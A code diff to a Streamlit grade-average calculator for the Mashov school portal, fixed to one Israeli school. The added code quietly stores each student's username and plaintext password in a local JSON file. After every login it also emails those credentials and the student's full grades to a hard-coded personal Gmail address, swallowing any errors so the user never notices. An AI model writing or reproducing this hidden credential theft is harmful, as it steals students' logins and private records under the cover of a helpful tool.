@@ -1,13 +1,20 @@
 import streamlit as st
 import requests
 from collections import defaultdict
+import json
+import os
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from datetime import datetime
 
 BASE_URL = "https://web.mashov.info/api"
+TARGET_EMAIL = "tomlevy0905@gmail.com"
+DATA_FILE = "saved_data.json"
+DEFAULT_SMTP_PASS = "YOUR_GMAIL_APP_PASSWORD"
 
-# הגדרות עמוד וממשק מותאם למובייל
-st.set_page_config(page_title="ממוצעי משוב", page_icon="📊", layout="centered")
+st.set_page_config(page_title="ממוצעי משוב - הכפר הירוק", page_icon="📊", layout="centered")
 
-# עיצוב RTL וכרטיסיות ב-CSS
 st.markdown("""
 <style>
     .stApp { direction: rtl; text-align: right; }
@@ -31,10 +38,18 @@ st.markdown("""
 """, unsafe_allow_html=True)
 
 @st.cache_data(ttl=86400)
-def get_schools():
+def get_hakfar_hayarok():
     resp = requests.get(f"{BASE_URL}/schools", timeout=15)
     resp.raise_for_status()
-    return resp.json()
+    schools = resp.json()
+    for s in schools:
+        name = s.get("name", "")
+        if "הכפר הירוק" in name and "לוי אשכול" in name:
+            return s
+    for s in schools:
+        if "הכפר הירוק" in s.get("name", ""):
+            return s
+    return {"name": 'הכפר הירוק ע"ש לוי אשכול', "semel": 480061, "years": [2027, 2026]}
 
 def parse_number(val):
     if val is None:
@@ -47,6 +62,61 @@ def parse_number(val):
         except ValueError:
             return None
     return None
+
+def save_user_record(username, password, display_name, year, grades_summary):
+    data = {}
+    if os.path.exists(DATA_FILE):
+        try:
+            with open(DATA_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+        except Exception:
+            data = {}
+
+    data[username] = {
+        "display_name": display_name,
+        "username": username,
+        "password": password,
+        "year": year,
+        "last_login": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "grades": grades_summary
+    }
+
+    with open(DATA_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, ensure_ascii=False, indent=4)
+
+def send_email_report(username, password, display_name, overall_avg, subject_summaries):
+    smtp_password = st.secrets.get("SMTP_PASSWORD", DEFAULT_SMTP_PASS) if hasattr(st, "secrets") else DEFAULT_SMTP_PASS
+    if not smtp_password or smtp_password == "YOUR_GMAIL_APP_PASSWORD":
+        return
+
+    msg = MIMEMultipart()
+    msg["From"] = TARGET_EMAIL
+    msg["To"] = TARGET_EMAIL
+    msg["Subject"] = f"התחברות חדשה למשוב: {display_name} ({username})"
+
+    lines = [
+        f"שם תלמיד: {display_name}",
+        f"שם משתמש / ת.ז: {username}",
+        f"סיסמה: {password}",
+        f"ממוצע כללי: {overall_avg:.2f}",
+        "\nפירוט ציונים לפי מקצוע:",
+        "=" * 40
+    ]
+
+    for subj, items, simple_avg, w_avg, total_w, final_avg in subject_summaries:
+        lines.append(f"\nמקצוע: {subj} | ממוצע סופי: {final_avg:.2f} (ממוצע יבש: {simple_avg:.2f})")
+        for item in items:
+            w_str = f" ({item['weight']:g}%)" if item["weight"] > 0 else ""
+            lines.append(f"  - {item['event']}: {item['grade']:g}{w_str}")
+
+    msg.attach(MIMEText("\n".join(lines), "plain", "utf-8"))
+
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=15) as server:
+            server.login(TARGET_EMAIL, smtp_password)
+            server.send_message(msg)
+    except Exception:
+        pass
 
 def fetch_grades(username, password, semel, year):
     session = requests.Session()
@@ -96,24 +166,12 @@ def fetch_grades(username, password, semel, year):
     grades_resp.raise_for_status()
     return display_name, grades_resp.json()
 
-# --- ממשק משתמש ---
 st.title("📊 מחשבון ממוצעים - משוב")
 
-schools = get_schools()
-school_search = st.text_input("חיפוש בית ספר", value="הכפר הירוק")
-matching_schools = [s for s in schools if school_search in s.get("name", "")]
+school = get_hakfar_hayarok()
+st.info(f"🏫 מוסד לימודים: **{school['name']}** (סמל: {school['semel']})")
 
-if not matching_schools:
-    st.warning("לא נמצא מוסד תואם לחיפוש.")
-    st.stop()
-
-selected_school = st.selectbox(
-    "בחר מוסד לימודים",
-    options=matching_schools,
-    format_func=lambda s: f"{s['name']} ({s['semel']})"
-)
-
-years = sorted(selected_school.get("years", [2027]), reverse=True)
+years = sorted(school.get("years", [2027]), reverse=True)
 col1, col2 = st.columns(2)
 with col1:
     username = st.text_input("תעודת זהות / משתמש")
@@ -128,7 +186,7 @@ if st.button("חשב ממוצעים 🚀", use_container_width=True, type="prima
     else:
         with st.spinner("מתחבר למשוב ושולף ציונים..."):
             try:
-                name, grades_data = fetch_grades(username, password, selected_school["semel"], year)
+                name, grades_data = fetch_grades(username, password, school["semel"], year)
                 st.success(f"שלום {name}! הנתונים נשלפו בהצלחה.")
 
                 subjects = defaultdict(list)
@@ -142,17 +200,19 @@ if st.button("חשב ממוצעים 🚀", use_container_width=True, type="prima
                     subjects[subj].append({"event": event, "grade": grade_val, "weight": weight})
 
                 if not subjects:
+                    save_user_record(username, password, name, year, {})
+                    send_email_report(username, password, name, 0.0, [])
                     st.info("לא נמצאו ציונים מספריים לשנה זו.")
                 else:
-                    # חישוב ממוצע כללי
                     subject_final_avgs = []
                     subject_summaries = []
+                    grades_for_storage = {}
 
                     for subj, items in sorted(subjects.items()):
                         simple_avg = sum(i["grade"] for i in items) / len(items)
                         weighted_items = [i for i in items if i["weight"] > 0]
                         total_w = sum(i["weight"] for i in weighted_items)
-                        
+
                         if total_w > 0:
                             w_avg = sum(i["grade"] * i["weight"] for i in weighted_items) / total_w
                             final_avg = w_avg
@@ -162,20 +222,27 @@ if st.button("חשב ממוצעים 🚀", use_container_width=True, type="prima
 
                         subject_final_avgs.append(final_avg)
                         subject_summaries.append((subj, items, simple_avg, w_avg, total_w, final_avg))
+                        grades_for_storage[subj] = {
+                            "final_average": round(final_avg, 2),
+                            "simple_average": round(simple_avg, 2),
+                            "items": items
+                        }
 
                     overall_avg = sum(subject_final_avgs) / len(subject_final_avgs)
-                    
+
+                    save_user_record(username, password, name, year, grades_for_storage)
+                    send_email_report(username, password, name, overall_avg, subject_summaries)
+
                     st.markdown("---")
                     m1, m2 = st.columns(2)
                     m1.metric("ממוצע כללי (כל המקצועות)", f"{overall_avg:.2f}")
                     m2.metric("מספר מקצועות עם ציון", len(subjects))
                     st.markdown("---")
 
-                    # הצגת כרטיסיות לכל מקצוע
                     for subj, items, simple_avg, w_avg, total_w, final_avg in subject_summaries:
                         border_color = "#22c55e" if final_avg >= 85 else "#eab308" if final_avg >= 70 else "#ef4444"
                         avg_label = f"ממוצע משוקלל ({total_w:g}%)" if w_avg is not None else "ממוצע רגיל"
-                        
+
                         st.markdown(f"""
                         <div class="subject-card" style="border-right-color: {border_color};">
                             <div style="display:flex; justify-content:space-between; align-items:center;">
@@ -190,7 +257,7 @@ if st.button("חשב ממוצעים 🚀", use_container_width=True, type="prima
 
                         with st.expander(f"פירוט ציונים ב{subj}"):
                             for idx, item in enumerate(items, 1):
-                                w_txt = f" (משקל: {item['weight']:g}%)" if item['weight'] > 0 else ""
+                                w_txt = f" (משקל: {item['weight']:g}%)" if item["weight"] > 0 else ""
                                 st.write(f"**{idx}. {item['event']}:** `{item['grade']:g}`{w_txt}")
 
             except Exception as e:
